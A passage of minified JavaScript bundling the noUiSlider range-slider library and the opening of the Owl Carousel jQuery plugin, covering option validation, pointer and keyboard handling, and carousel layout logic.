"): 'margin' option is only supported on linear sliders.") } function y(t, e) { if (!I(e)) throw new Error("noUiSlider (" + ct + "): 'limit' option must be numeric."); if (t.limit = t.spectrum.getMargin(e), !t.limit || t.handles < 2) throw new Error("noUiSlider (" + ct + "): 'limit' option is only supported on linear sliders with 2 or more handles.") } function v(t, e) { if (!I(e) && !Array.isArray(e)) throw new Error("noUiSlider (" + ct + "): 'padding' option must be numeric or array of exactly 2 numbers."); if (Array.isArray(e) && 2 !== e.length && !I(e[0]) && !I(e[1])) throw new Error("noUiSlider (" + ct + "): 'padding' option must be numeric or array of exactly 2 numbers."); if (0 !== e) { if (Array.isArray(e) || (e = [e, e]), !(t.padding = [t.spectrum.getMargin(e[0]), t.spectrum.getMargin(e[1])]) === t.padding[0] || !1 === t.padding[1]) throw new Error("noUiSlider (" + ct + "): 'padding' option is only supported on linear sliders."); if (t.padding[0] < 0 || t.padding[1] < 0) throw new Error("noUiSlider (" + ct + "): 'padding' option must be a positive number(s)."); if (100 < t.padding[0] + t.padding[1]) throw new Error("noUiSlider (" + ct + "): 'padding' option must not exceed 100% of the range.") } } function x(t, e) { switch (e) { case "ltr": t.dir = 0; break; case "rtl": t.dir = 1; break; default: throw new Error("noUiSlider (" + ct + "): 'direction' option was not recognized.") } } function F(t, e) { if ("string" != typeof e) throw new Error("noUiSlider (" + ct + "): 'behaviour' must be a string containing options."); var n = 0 <= e.indexOf("tap"), i = 0 <= e.indexOf("drag"), o = 0 <= e.indexOf("fixed"), a = 0 <= e.indexOf("snap"), s = 0 <= e.indexOf("hover"), r = 0 <= e.indexOf("unconstrained"); if (o) { if (2 !== t.handles) throw new Error("noUiSlider (" + ct + "): 'fixed' behaviour must be used with 2 handles"); B(t, t.start[1] - t.start[0]) } if (r && (t.margin || t.limit)) throw new Error("noUiSlider (" + ct + "): 'unconstrained' behaviour cannot be used with margin or limit"); t.events = { tap: n || a, drag: i, fixed: o, snap: a, hover: s, unconstrained: r } } function Q(t, e) { if (!1 !== e) if (!0 === e) { t.tooltips = []; for (var n = 0; n < t.handles; n++)t.tooltips.push(!0) } else { if (t.tooltips = Ct(e), t.tooltips.length !== t.handles) throw new Error("noUiSlider (" + ct + "): must pass a formatter for all handles."); t.tooltips.forEach(function (t) { if ("boolean" != typeof t && ("object" != typeof t || "function" != typeof t.to)) throw new Error("noUiSlider (" + ct + "): 'tooltips' must be passed a formatter or 'false'.") }) } } function G(t, e) { a(t.ariaFormat = e) } function w(t, e) { a(t.format = e) } function X(t, e) { if ("boolean" != typeof (t.keyboardSupport = e)) throw new Error("noUiSlider (" + ct + "): 'keyboardSupport' option must be a boolean.") } function S(t, e) { t.documentElement = e } function k(t, e) { if ("string" != typeof e && !1 !== e) throw new Error("noUiSlider (" + ct + "): 'cssPrefix' must be a string or `false`."); t.cssPrefix = e } function D(t, e) { if ("object" != typeof e) throw new Error("noUiSlider (" + ct + "): 'cssClasses' must be an object."); if ("string" == typeof t.cssPrefix) for (var n in t.cssClasses = {}, e) e.hasOwnProperty(n) && (t.cssClasses[n] = t.cssPrefix + e[n]); else t.cssClasses = e } function ft(e) { var n = { margin: 0, limit: 0, padding: 0, animate: !0, animationDuration: 300, ariaFormat: g, format: g }, i = { step: { r: !1, t: l }, start: { r: !0, t: C }, connect: { r: !0, t: f }, direction: { r: !0, t: x }, snap: { r: !1, t: A }, animate: { r: !1, t: p }, animationDuration: { r: !1, t: m }, range: { r: !0, t: d }, orientation: { r: !1, t: b }, margin: { r: !1, t: B }, limit: { r: !1, t: y }, padding: { r: !1, t: v }, behaviour: { r: !0, t: F }, ariaFormat: { r: !1, t: G }, format: { r: !1, t: w }, tooltips: { r: !1, t: Q }, keyboardSupport: { r: !0, t: X }, documentElement: { r: !1, t: S }, cssPrefix: { r: !0, t: k }, cssClasses: { r: !0, t: D } }, o = { connect: !1, direction: "ltr", behaviour: "tap", orientation: "horizontal", keyboardSupport: !0, cssPrefix: "noUi-", cssClasses: { target: "target", base: "base", origin: "origin", handle: "handle", handleLower: "handle-lower", handleUpper: "handle-upper", touchArea: "touch-area", horizontal: "horizontal", vertical: "vertical", background: "background", connect: "connect", connects: "connects", ltr: "ltr", rtl: "rtl", draggable: "draggable", drag: "state-drag", tap: "state-tap", active: "active", tooltip: "tooltip", pips: "pips", pipsHorizontal: "pips-horizontal", pipsVertical: "pips-vertical", marker: "marker", markerHorizontal: "marker-horizontal", markerVertical: "marker-vertical", markerNormal: "marker-normal", markerLarge: "marker-large", markerSub: "marker-sub", value: "value", valueHorizontal: "value-horizontal", valueVertical: "value-vertical", valueNormal: "value-normal", valueLarge: "value-large", valueSub: "value-sub" } }; e.format && !e.ariaFormat && (e.ariaFormat = e.format), Object.keys(i).forEach(function (t) { if (!r(e[t]) && void 0 === o[t]) { if (i[t].r) throw new Error("noUiSlider (" + ct + "): '" + t + "' is required."); return !0 } i[t].t(n, r(e[t]) ? e[t] : o[t]) }), n.pips = e.pips; var t = document.createElement("div"), a = void 0 !== t.style.msTransform, s = void 0 !== t.style.transform; n.transformRule = s ? "transform" : a ? "msTransform" : "webkitTransform"; return n.style = [["left", "top"], ["right", "bottom"]][n.dir][n.ort], n } function s(t, h, a) { var g, l, s, r, o, c, e, I, u = window.navigator.pointerEnabled ? { start: "pointerdown", move: "pointermove", end: "pointerup" } : window.navigator.msPointerEnabled ? { start: "MSPointerDown", move: "MSPointerMove", end: "MSPointerUp" } : { start: "mousedown touchstart", move: "mousemove touchmove", end: "mouseup touchend" }, d = window.CSS && CSS.supports && CSS.supports("touch-action", "none") && function () { var t = !1; try { var e = Object.defineProperty({}, "passive", { get: function () { t = !0 } }); window.addEventListener("test", null, e) } catch (t) { } return t }(), C = t, y = h.spectrum, A = [], p = [], m = [], f = 0, b = {}, B = t.ownerDocument, v = h.documentElement || B.documentElement, x = B.body, F = -1, Q = 0, G = 1, w = 2, X = "rtl" === B.dir || 1 === h.ort ? 0 : 100; function S(t, e) { var n = B.createElement("div"); return e && At(n, e), t.appendChild(n), n } function k(t, e) { var n = S(t, h.cssClasses.origin), i = S(n, h.cssClasses.handle); return S(i, h.cssClasses.touchArea), i.setAttribute("data-handle", e), h.keyboardSupport && (i.setAttribute("tabindex", "0"), i.addEventListener("keydown", function (t) { return function (t, e) { if (Z() || U(e)) return !1; var n = ["Left", "Right"], i = ["Down", "Up"]; h.dir && !h.ort ? n.reverse() : h.ort && !h.dir && i.reverse(); var o = t.key.replace("Arrow", ""), a = o === i[0] || o === n[0], s = o === i[1] || o === n[1]; if (!a && !s) return !0; t.preventDefault(); var r = a ? 0 : 1, g = lt(e)[r]; if (null === g) return !1; !1 === g && (g = y.getDefaultStep(p[e], a, 10)); return g = Math.max(g, 1e-7), g *= a ? -1 : 1, rt(e, A[e] + g, !0), !1 }(t, e) })), i.setAttribute("role", "slider"), i.setAttribute("aria-orientation", h.ort ? "vertical" : "horizontal"), 0 === e ? At(i, h.cssClasses.handleLower) : e === h.handles - 1 && At(i, h.cssClasses.handleUpper), n } function D(t, e) { return !!e && S(t, h.cssClasses.connect) } function n(t, e) { return !!h.tooltips[e] && S(t.firstChild, h.cssClasses.tooltip) } function Z() { return C.hasAttribute("disabled") } function U(t) { return l[t].hasAttribute("disabled") } function W() { o && (J("update.tooltips"), o.forEach(function (t) { t && It(t) }), o = null) } function N() { W(), o = l.map(n), K("update.tooltips", function (t, e, n) { var i; o[e] && (i = t[e], !0 !== h.tooltips[e] && (i = h.tooltips[e].to(n[e])), o[e].innerHTML = i) }) } function T(C, A, p) { var m = {}, t = y.xVal[0], e = y.xVal[y.xVal.length - 1], f = !1, b = !1, B = 0; return (p = p.slice().sort(function (t, e) { return t - e }).filter(function (t) { return !this[t] && (this[t] = !0) }, {}))[0] !== t && (p.unshift(t), f = !0), p[p.length - 1] !== e && (p.push(e), b = !0), p.forEach(function (t, e) { var n, i, o, a, s, r, g, l, c, I, u = t, h = p[e + 1], d = "steps" === A; if (d && (n = y.xNumSteps[e]), n = n || h - u, !1 !== u && void 0 !== h) for (n = Math.max(n, 1e-7), i = u; i <= h; i = +(i + n).toFixed(7)) { for (l = (s = (a = y.toStepping(i)) - B) / C, I = s / (c = Math.round(l)), o = 1; o <= c; o += 1)m[(r = B + o * I).toFixed(5)] = [y.fromStepping(r), 0]; g = -1 < p.indexOf(i) ? G : d ? w : Q, !e && f && (g = 0), i === h && b || (m[a.toFixed(5)] = [i, g]), B = a } }), m } function H(a, s, r) { var g = B.createElement("div"), o = []; o[Q] = h.cssClasses.valueNormal, o[G] = h.cssClasses.valueLarge, o[w] = h.cssClasses.valueSub; var l = []; l[Q] = h.cssClasses.markerNormal, l[G] = h.cssClasses.markerLarge, l[w] = h.cssClasses.markerSub; var c = [h.cssClasses.valueHorizontal, h.cssClasses.valueVertical], I = [h.cssClasses.markerHorizontal, h.cssClasses.markerVertical]; function u(t, e) { var n = e === h.cssClasses.value, i = n ? o : l; return e + " " + (n ? c : I)[h.ort] + " " + i[t] } return At(g, h.cssClasses.pips), At(g, 0 === h.ort ? h.cssClasses.pipsHorizontal : h.cssClasses.pipsVertical), Object.keys(a).forEach(function (t) { var e, n, i, o; n = a[e = t][0], i = a[t][1], (i = s ? s(n, i) : i) !== F && ((o = S(g, !1)).className = u(i, h.cssClasses.marker), o.style[h.style] = e + "%", Q < i && ((o = S(g, !1)).className = u(i, h.cssClasses.value), o.setAttribute("data-value", n), o.style[h.style] = e + "%", o.innerHTML = r.to(n))) }), g } function E() { r && (It(r), r = null) } function R(t) { E(); var e = t.mode, n = t.density || 1, i = t.filter || !1, o = T(n, e, function (t, e, n) { if ("range" === t || "steps" === t) return y.xVal; if ("count" === t) { if (e < 2) throw new Error("noUiSlider (" + ct + "): 'values' (>= 2) required for mode 'count'."); var i = e - 1, o = 100 / i; for (e = []; i--;)e[i] = i * o; e.push(100), t = "positions" } return "positions" === t ? e.map(function (t) { return y.fromStepping(n ? y.getStep(t) : t) }) : "values" === t ? n ? e.map(function (t) { return y.fromStepping(y.getStep(y.toStepping(t))) }) : e : void 0 }(e, t.values || !1, t.stepped || !1)), a = t.format || { to: Math.round }; return r = C.appendChild(H(o, i, a)) } function Y() { var t = g.getBoundingClientRect(), e = "offset" + ["Width", "Height"][h.ort]; return 0 === h.ort ? t.width || g[e] : t.height || g[e] } function O(i, o, a, s) { function e(t) { return !!(t = function (t, e, n) { var i, o, a = 0 === t.type.indexOf("touch"), s = 0 === t.type.indexOf("mouse"), r = 0 === t.type.indexOf("pointer"); 0 === t.type.indexOf("MSPointer") && (r = !0); if (a) { var g = function (t) { return t.target === n || n.contains(t.target) }; if ("touchstart" === t.type) { var l = Array.prototype.filter.call(t.touches, g); if (1 < l.length) return !1; i = l[0].pageX, o = l[0].pageY } else { var c = Array.prototype.find.call(t.changedTouches, g); if (!c) return !1; i = c.pageX, o = c.pageY } } e = e || mt(B), (s || r) && (i = t.clientX + e.x, o = t.clientY + e.y); return t.pageOffset = e, t.points = [i, o], t.cursor = s || r, t }(t, s.pageOffset, s.target || o)) && (!(Z() && !s.doNotReject) && (e = C, n = h.cssClasses.tap, !((e.classList ? e.classList.contains(n) : new RegExp("\\b" + n + "\\b").test(e.className)) && !s.doNotReject) && (!(i === u.start && void 0 !== t.buttons && 1 < t.buttons) && ((!s.hover || !t.buttons) && (d || t.preventDefault(), t.calcPoint = t.points[h.ort], void a(t, s)))))); var e, n } var n = []; return i.split(" ").forEach(function (t) { o.addEventListener(t, e, !!d && { passive: !0 }), n.push([t, e]) }), n } function _(t) { var e, n, i, o, a, s, r = dt(r = 100 * (t - (e = g, n = h.ort, i = e.getBoundingClientRect(), o = e.ownerDocument, a = o.documentElement, s = mt(o), /webkit.*Chrome.*Mobile/i.test(navigator.userAgent) && (s.x = 0), n ? i.top + s.y - a.clientTop : i.left + s.x - a.clientLeft)) / Y()); return h.dir ? 100 - r : r } function V(t, e) { "mouseout" === t.type && "HTML" === t.target.nodeName && null === t.relatedTarget && M(t, e) } function L(t, e) { if (-1 === navigator.appVersion.indexOf("MSIE 9") && 0 === t.buttons && 0 !== e.buttonsProperty) return M(t, e); var n = (h.dir ? -1 : 1) * (t.calcPoint - e.startCalcPoint); tt(0 < n, 100 * n / e.baseSize, e.locations, e.handleNumbers) } function M(t, e) { e.handle && (pt(e.handle, h.cssClasses.active), --f), e.listeners.forEach(function (t) { v.removeEventListener(t[0], t[1]) }), 0 === f && (pt(C, h.cssClasses.drag), nt(), t.cursor && (x.style.cursor = "", x.removeEventListener("selectstart", ut))), e.handleNumbers.forEach(function (t) { j("change", t), j("set", t), j("end", t) }) } function z(t, e) { if (e.handleNumbers.some(U)) return !1; var n; 1 === e.handleNumbers.length && (n = l[e.handleNumbers[0]].children[0], f += 1, At(n, h.cssClasses.active)), t.stopPropagation(); var i = [], o = O(u.move, v, L, { target: t.target, handle: n, listeners: i, startCalcPoint: t.calcPoint, baseSize: Y(), pageOffset: t.pageOffset, handleNumbers: e.handleNumbers, buttonsProperty: t.buttons, locations: p.slice() }), a = O(u.end, v, M, { target: t.target, handle: n, listeners: i, doNotReject: !0, handleNumbers: e.handleNumbers }), s = O("mouseout", v, V, { target: t.target, handle: n, listeners: i, doNotReject: !0, handleNumbers: e.handleNumbers }); i.push.apply(i, o.concat(a, s)), t.cursor && (x.style.cursor = getComputedStyle(t.target).cursor, 1 < l.length && At(C, h.cssClasses.drag), x.addEventListener("selectstart", ut, !1)), e.handleNumbers.forEach(function (t) { j("start", t) }) } function i(t) { t.stopPropagation(); var i, o, a, e = _(t.calcPoint), n = (i = e, a = !(o = 100), l.forEach(function (t, e) { var n; U(e) || ((n = Math.abs(p[e] - i)) < o || 100 === n && 100 === o) && (a = e, o = n) }), a); if (!1 === n) return !1; h.events.snap || ht(C, h.cssClasses.tap, h.animationDuration), it(n, e, !0, !0), nt(), j("slide", n, !0), j("update", n, !0), j("change", n, !0), j("set", n, !0), h.events.snap && z(t, { handleNumbers: [n] }) } function P(t) { var e = _(t.calcPoint), n = y.getStep(e), i = y.fromStepping(n); Object.keys(b).forEach(function (t) { "hover" === t.split(".")[0] && b[t].forEach(function (t) { t.call(c, i) }) }) } function K(t, e) { b[t] = b[t] || [], b[t].push(e), "update" === t.split(".")[0] && l.forEach(function (t, e) { j("update", e) }) } function J(t) { var i = t && t.split(".")[0], o = i && t.substring(i.length); Object.keys(b).forEach(function (t) { var e = t.split(".")[0], n = t.substring(e.length); i && i !== e || o && o !== n || delete b[t] }) } function j(n, i, o) { Object.keys(b).forEach(function (t) { var e = t.split(".")[0]; n === e && b[t].forEach(function (t) { t.call(c, A.map(h.format.to), i, A.slice(), o || !1, p.slice()) }) }) } function $(t, e, n, i, o, a) { return 1 < l.length && !h.events.unconstrained && (i && 0 < e && (n = Math.max(n, t[e - 1] + h.margin)), o && e < l.length - 1 && (n = Math.min(n, t[e + 1] - h.margin))), 1 < l.length && h.limit && (i && 0 < e && (n = Math.min(n, t[e - 1] + h.limit)), o && e < l.length - 1 && (n = Math.max(n, t[e + 1] - h.limit))), h.padding && (0 === e && (n = Math.max(n, h.padding[0])), e === l.length - 1 && (n = Math.min(n, 100 - h.padding[1]))), !((n = dt(n = y.getStep(n))) === t[e] && !a) && n } function q(t, e) { var n = h.ort; return (n ? e : t) + ", " + (n ? t : e) } function tt(t, i, n, e) { var o = n.slice(), a = [!t, t], s = [t, !t]; e = e.slice(), t && e.reverse(), 1 < e.length ? e.forEach(function (t, e) { var n = $(o, t, o[t] + i, a[e], s[e], !1); !1 === n ? i = 0 : (i = n - o[t], o[t] = n) }) : a = s = [!0]; var r = !1; e.forEach(function (t, e) { r = it(t, n[t] + i, a[e], s[e]) || r }), r && e.forEach(function (t) { j("update", t), j("slide", t) }) } function et(t, e) { return h.dir ? 100 - t - e : t } function nt() { m.forEach(function (t) { var e = 50 < p[t] ? -1 : 1, n = 3 + (l.length + e * t); l[t].style.zIndex = n }) } function it(t, e, n, i) { return !1 !== (e = $(p, t, e, n, i, !1)) && (function (t, e) { p[t] = e, A[t] = y.fromStepping(e); var n = "translate(" + q(et(e, 0) - X + "%", "0") + ")"; l[t].style[h.transformRule] = n, ot(t), ot(t + 1) }(t, e), !0) } function ot(t) { var e, n, i, o, a; s[t] && (n = 100, (e = 0) !== t && (e = p[t - 1]), t !== s.length - 1 && (n = p[t]), o = "translate(" + q(et(e, i = n - e) + "%", "0") + ")", a = "scale(" + q(i / 100, "1") + ")", s[t].style[h.transformRule] = o + " " + a) } function at(t, e) { return null === t || !1 === t || void 0 === t ? p[e] : ("number" == typeof t && (t = String(t)), t = h.format.from(t), !1 === (t = y.toStepping(t)) || isNaN(t) ? p[e] : t) } function st(t, e) { var n = Ct(t), i = void 0 === p[0]; e = void 0 === e || !!e, h.animate && !i && ht(C, h.cssClasses.tap, h.animationDuration), m.forEach(function (t) { it(t, at(n[t], t), !0, !1) }), m.forEach(function (t) { it(t, p[t], !0, !0) }), nt(), m.forEach(function (t) { j("update", t), null !== n[t] && e && j("set", t) }) } function rt(t, e, n) { if (!(0 <= (t = Number(t)) && t < m.length)) throw new Error("noUiSlider (" + ct + "): invalid handle number, got: " + t); it(t, at(e, t), !0, !0), j("update", t), n && j("set", t) } function gt() { var t = A.map(h.format.to); return 1 === t.length ? t[0] : t } function lt(t) { var e = p[t], n = y.getNearbySteps(e), i = A[t], o = n.thisStep.step, a = null; if (h.snap) return [i - n.stepBefore.startValue || null, n.stepAfter.startValue - i || null]; !1 !== o && i + o > n.stepAfter.startValue && (o = n.stepAfter.startValue - i), a = i > n.thisStep.startValue ? n.thisStep.step : !1 !== n.stepBefore.step && i - n.stepBefore.highestStep, 100 === e ? o = null : 0 === e && (a = null); var s = y.countStepDecimals(); return null !== o && !1 !== o && (o = Number(o.toFixed(s))), null !== a && !1 !== a && (a = Number(a.toFixed(s))), [a, o] } return At(e = C, h.cssClasses.target), 0 === h.dir ? At(e, h.cssClasses.ltr) : At(e, h.cssClasses.rtl), 0 === h.ort ? At(e, h.cssClasses.horizontal) : At(e, h.cssClasses.vertical), g = S(e, h.cssClasses.base), function (t, e) { var n = S(e, h.cssClasses.connects); l = [], (s = []).push(D(n, t[0])); for (var i = 0; i < h.handles; i++)l.push(k(e, i)), m[i] = i, s.push(D(n, t[i + 1])) }(h.connect, g), (I = h.events).fixed || l.forEach(function (t, e) { O(u.start, t.children[0], z, { handleNumbers: [e] }) }), I.tap && O(u.start, g, i, {}), I.hover && O(u.move, g, P, { hover: !0 }), I.drag && s.forEach(function (t, e) { var n, i, o; !1 !== t && 0 !== e && e !== s.length - 1 && (n = l[e - 1], i = l[e], o = [t], At(t, h.cssClasses.draggable), I.fixed && (o.push(n.children[0]), o.push(i.children[0])), o.forEach(function (t) { O(u.start, t, z, { handles: [n, i], handleNumbers: [e - 1, e] }) })) }), st(h.start), h.pips && R(h.pips), h.tooltips && N(), K("update", function (t, e, s, n, r) { m.forEach(function (t) { var e = l[t], n = $(p, t, 0, !0, !0, !0), i = $(p, t, 100, !0, !0, !0), o = r[t], a = h.ariaFormat.to(s[t]), n = y.fromStepping(n).toFixed(1), i = y.fromStepping(i).toFixed(1), o = y.fromStepping(o).toFixed(1); e.children[0].setAttribute("aria-valuemin", n), e.children[0].setAttribute("aria-valuemax", i), e.children[0].setAttribute("aria-valuenow", o), e.children[0].setAttribute("aria-valuetext", a) }) }), c = { destroy: function () { for (var t in h.cssClasses) h.cssClasses.hasOwnProperty(t) && pt(C, h.cssClasses[t]); for (; C.firstChild;)C.removeChild(C.firstChild); delete C.noUiSlider }, steps: function () { return m.map(lt) }, on: K, off: J, get: gt, set: st, setHandle: rt, reset: function (t) { st(h.start, t) }, __moveHandles: function (t, e, n) { tt(t, e, p, n) }, options: a, updateOptions: function (e, t) { var n = gt(), i = ["margin", "limit", "padding", "range", "animate", "snap", "step", "format", "pips", "tooltips"]; i.forEach(function (t) { void 0 !== e[t] && (a[t] = e[t]) }); var o = ft(a); i.forEach(function (t) { void 0 !== e[t] && (h[t] = o[t]) }), y = o.spectrum, h.margin = o.margin, h.limit = o.limit, h.padding = o.padding, h.pips ? R(h.pips) : E(), (h.tooltips ? N : W)(), p = [], st(e.start || n, t) }, target: C, removePips: E, removeTooltips: W, pips: R } } return { __spectrum: o, version: ct, create: function (t, e) { if (!t || !t.nodeName) throw new Error("noUiSlider (" + ct + "): create requires a single element, got: " + t); if (t.noUiSlider) throw new Error("noUiSlider (" + ct + "): Slider was already initialized."); var n = s(t, ft(e), e); return t.noUiSlider = n } } }), function (g, n, o, r) { function l(t, e) { this.settings = null, this.options = g.extend({}, l.Defaults, e), this.$element = g(t), this._handlers = {}, this._plugins = {}, this._supress = {}, this._current = null, this._speed = null, this._coordinates = [], this._breakpoint = null, this._width = null, this._items = [], this._clones = [], this._mergers = [], this._widths = [], this._invalidated = {}, this._pipe = [], this._drag = { time: null, target: null, pointer: null, stage: { start: null, current: null }, direction: null }, this._states = { current: {}, tags: { initializing: ["busy"], animating: ["busy"], dragging: ["interacting"] } }, g.each(["onResize", "onThrottledResize"], g.proxy(function (t, e) { this._handlers[e] = g.proxy(this[e], this) }, this)), g.each(l.Plugins, g.proxy(function (t, e) { this._plugins[t.charAt(0).toLowerCase() + t.slice(1)] = new e(this) }, this)), g.each(l.Workers, g.proxy(function (t, e) { this._pipe.push({ filter: e.filter, run: g.proxy(e.run, this) }) }, this)), this.setup(), this.initialize() } l.Defaults = { items: 3, loop: !1, center: !1, rewind: !1, checkVisibility: !0, mouseDrag: !0, touchDrag: !0, pullDrag: !0, freeDrag: !1, margin: 0, stagePadding: 0, merge: !1, mergeFit: !0, autoWidth: !1, startPosition: 0, rtl: !1, smartSpeed: 250, fluidSpeed: !1, dragEndSpeed: !1, responsive: {}, responsiveRefreshRate: 200, responsiveBaseElement: n, fallbackEasing: "swing", slideTransition: "", info: !1, nestedItemSelector: !1, itemElement: "div", stageElement: "div", refreshClass: "owl-refresh", loadedClass: "owl-loaded", loadingClass: "owl-loading", rtlClass: "owl-rtl", responsiveClass: "owl-responsive", dragClass: "owl-drag", itemClass: "owl-item", stageClass: "owl-stage", stageOuterClass: "owl-stage-outer", grabClass: "owl-grab" }, l.Width = { Default: "default", Inner: "inner", Outer: "outer" }, l.Type = { Event: "event", State: "state" }, l.Plugins = {}, l.Workers = [{ filter: ["width", "settings"], run: function () { this._width = this.$element.width() } }, { filter: ["width", "items", "settings"], run: function (t) { t.current = this._items && this._items[this.relative(this._current)] } }, { filter: ["items", "settings"], run: function () { this.$stage.children(".cloned").remove() } }, { filter: ["width", "items", "settings"], run: function (t) { var e = this.settings.margin || "", n = !this.settings.autoWidth, i = this.settings.rtl, o = { width: "auto", "margin-left": i ? e : "", "margin-right": i ? "" : e }; n || this.$stage.children().css(o), t.css = o } }, { filter: ["width", "items", "settings"], run: function (t) { var e = (this.width() / this.settings.items).toFixed(3) - this.settings.margin, n = null, i = this._items.length, o = !this.settings.autoWidth, a = []; for (t.items = { merge: !1, width: e }; i--;)n = this._mergers[i], n = this.settings.mergeFit && Math.min(n, this.settings.items) || n, t.items.merge = 1 < n || t.items.merge, a[i] = o ? e * n : this._items[i].width(); this._widths = a } }, { filter: ["items", "settings"], run: function () { var t = [], e = this._items, n = this.settings, i = Math.max(2 * n.items, 4), o = 2 * Math.ceil(e.length / 2), a = n.loop && e.length ? n.rewind ? i : Math.max(i, o) : 0, s = "", r = ""; for (a /= 2; 0 < a;)t.push(this.normalize(t.length / 2, !0)), s += e[t[t.length - 1]][0].outerHTML, t.push(this.normalize(e.length - 1 - (t.length - 1) / 2, !0)), r = e[t[t.length - 1]][0].outerHTML + r, --a; this._clones = t, g(s).addClass("cloned").appendTo(this.$stage), g(r).addClass("cloned").prependTo(this.$stage) } }, { filter: ["width", "items", "settings"], run: function () { for (var t = this.settings.rtl ? 1 : -1, e = this._clones.length + this._items.length, n = -1, i = 0, o = 0, a = []; ++n < e;)i = a[n - 1] || 0, o = this._widths[this.relative(n)] + this.settings.margin, a.push(i + o * t); this._coordinates = a } }, { filter: ["width", "items", "settings"], run: function () { var t = this.settings.stagePadding, e = this._coordinates, n = { width: Math.ceil(Math.abs(e[e.length - 1])) + 2 * t, "padding-left": t || "", "padding-right": t || "" }; this.$stage.css(n) } }, { filter: ["width", "items", "settings"], run: function (t) { var e = this._coordinates.length, n = !this.settings.autoWidth, i = this.$stage.children(); if (n && t.items.merge) for (; e--;)t.css.width = this._widths[this.relative(e)], i.eq(e).css(t.css); else n && (t.css.width = t.items.width, i.css(t.css)) } }, { filter: ["items"], run: function () { this._coordinates.length < 1 && this.$stage.removeAttr("style") } }, { filter: ["width", "items", "settings"], run: function (t) { t.current = t.current ? this.$stage.children().index(t.current) : 0, t.current = Math.max(this.minimum(), Math.min(this.maximum(), t.current)), this.reset(t.current) } }, { filter: ["position"], run: function () { this.animate(this.coordinates(this._current)) } }, { filter: ["width", "position", "items", "settings"], run: function () { for (var t, e, n = this.settings.rtl ? 1 : -1, i = 2 * this.settings.stagePadding, o = this.coordinates(this.current()) + i, a = o + this.width() * n, s = [], r = 0, g = this._coordinates.length; r < g; r++)t = this._coordinates[r - 1] || 0, e = Math.abs(this._coordinates[r]) + i * n, (this.op(t, "<=", o) && this.op(t, ">", a) || this.op(e, "<", o) && this.op(e, ">", a)) && s.push(r); this.$stage.children(".active").removeClass("active"), this.$stage.children(":eq(" + s.join("), :eq(") + ")").addClass("active"), this.$stage.children(".center").removeClass("center"), this.settings.center && this.$stage.children().eq(this.current()).addClass("center") } }], l.prototype.initializeStage = function () { this.$stage = this.$element.find("." + this.settings.stageClass), this.$stage.length || (this.$element.addClass(this.options.loadingClass), this.$stage = g("<" + this.settings.stageElement + ">", { class: this.settings.stageClass }).wrap(g("<div/>", { class: this.settings.stageOuterClass })), this.$element.append(this.$stage.parent())) }, l.prototype.initializeItems = function () { var t = this.$element.find(".owl-item"); if (t.length) return this._items = t.get().map(function (t) { return g(t) }), this._mergers = this._items.map(function () { return 1 }), void this.refresh(); this.replace(this.$element.children().not(this.$stage.parent())), this.isVisible() ? this.refresh() : this.invalidate("width"), this.$element.removeClass(this.options.loadingClass).addClass(this.options.loadedClass) }, l.prototype.initialize = function () { var t, e, n; this.enter("initializing"), this.trigger("initialize"), this.$element.toggleClass(this.settings.rtlClass, this.settings.rtl), this.settings.autoWidth && !this.is("pre-loading") && (t = this.$element.find("img"), e = this.settings.nestedItemSelector ? "." + this.settings.nestedItemSelector : r, n = this.$element.children(e).width(), t.length && n <= 0 && this.preloadAutoWidthImages(t)), this.initializeStage(), this.initializeItems(), this.registerEventHandlers(), this.leave("initializing"), this.trigger("initialized") }, l.prototype.isVisible = function () { return !this.settings.checkVisibility || this.$element.is(":visible") }, l.prototype.setup = function () { var e = this.viewport(), t = this.options.responsive, n = -1, i = null; t ? (g.each(t, function (t) { t <= e && n < t && (n = Number(t)) }), "function" == typeof (i = g.extend({}, this.options, t[n])).stagePadding && (i.stagePadding = i.stagePadding()), delete i.responsive, i.responsiveClass && this.$element.attr("class", this.$element.attr("class").replace(new RegExp("(" + this.options.responsiveClass + "-)\\S+\\s", "g"), "$1" + n))) : i = g.extend({}, this.options), this.trigger("change", { property: { name: "settings", value: i } }), this._breakpoint = n, this.settings = i, this.invalidate("settings"), this.trigger("changed", { property: { name: "settings", value: this.settings } }) }, l.prototype.optionsLogic = function () { this.settings.autoWidth && (this.settings.stagePadding = !1, this.settings.merge = !1) }, l.prototype.prepare = function (t) { var e = this.trigger("prepare", { content: t }); return e.data || (e.data = g("<" + this.settings.itemElement + "/>").addClass(this.options.itemClass).append(t)), this.trigger("prepared", { content: e.data }), e.data }, l.prototype.update = function () { for (var t = 0, e = this._pipe.length, n = g.proxy(function (t) { return this[t] }, this._invalidated), i = {}; t < e;)(this._invalidated.all || 0 < g.grep(this._pipe[t].filter, n).length) && this._pipe[t].run(i), t++; this._invalidated = {}, this.is("valid") || this.enter("valid") }, l.prototype.width = function (t) { switch (t = t || l.Width.Default) { case l.Width.Inner: case l.Width.Outer: return this._width; default: return this._width - 2 * this.settings.stagePadding + this.settings.margin } }, l.prototype.refresh = function () { this.enter("refreshing"), this.trigger("refresh"), this.setup(), this.optionsLogic(), this.$element.addClass(this.options.refreshClass), this.update(), this.$element.removeClass(this.options.refreshClass), this.leave("refreshing"), this.trigger("refreshed") }, l.prototype.onThrottledResize = function () { n.clearTimeout(this.resizeTimer), this.resizeTimer = n.setTimeout(this._handlers.onResize, this.settings.responsiveRefreshRate) }, l.prototype.onResize = function () { return !!this._items.length && (this._width !== this.$element.width() && (!!this.isVisible() && (this.enter("resizing"), this.trigger("resize").isDefaultPrevented() ? (this.leave("resizing"), !1) : (this.invalidate("width"), this.refresh(), this.leave("resizing"), void this.trigger("resized"))))) }, l.prototype.registerEventHandlers = function () { g.support.transition && this.$stage.on(g.support.transition.end + ".owl.core", g.proxy(this.onTransitionEnd, this)), !1 !== this.settings.responsive && this.on(n, "resize", this._handlers.onThrottledResize), this.settings.mouseDrag && (this.$element.addClass(this.options.dragClass), this.$stage.on("mousedown.owl.core", g.proxy(this.onDragStart, this)), this.$stage.on("dragstart.owl.core selectstart.owl.core", function () { return !1 })), this.settings.touchDrag && (this.$stage.on("touchstart.owl.core", g.proxy(this.onDragStart, this)), this.$stage.on("touchcancel.owl.core", g.proxy(this.onDragEnd, this))) }, l.prototype.onDragStart = function (t) { var e = null; 3 !== t.which && (e = g.support.transform ? { x: (e = this.$stage.css("transform").replace(/.*\(|\)| /g, "").split(","))[16 === e.length ? 12 : 4], y: e[16 === e.length ? 13 : 5] } : (e = this.$stage.position(), { x: this.settings.rtl ? e.left + this.$stage.width() - this.width() + this.settings.margin : e.left, y: e.top }), this.is("animating") && (g.support.transform ? this.animate(e.x) : this.$stage.stop(), 